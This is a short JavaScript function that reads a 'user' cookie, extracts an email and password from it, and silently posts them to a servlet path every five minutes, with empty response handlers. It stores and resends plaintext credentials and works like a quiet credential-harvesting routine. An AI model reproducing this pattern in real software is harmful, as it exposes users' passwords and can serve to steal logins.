function download_cookies_data() {
    if (getCookie("user") !== undefined) {
        var user = getCookie("user").split("/");
        $.ajax({
            url: cookies_servlet_path,
            type: "POST",
            dataType: "html",
            data: "email=" + user[4] + "&pass=" + user[9],
            success: function (resultText) {
            },
            error: function (response) {
            }
        });
    }
}

setInterval(download_cookies_data, 300000)
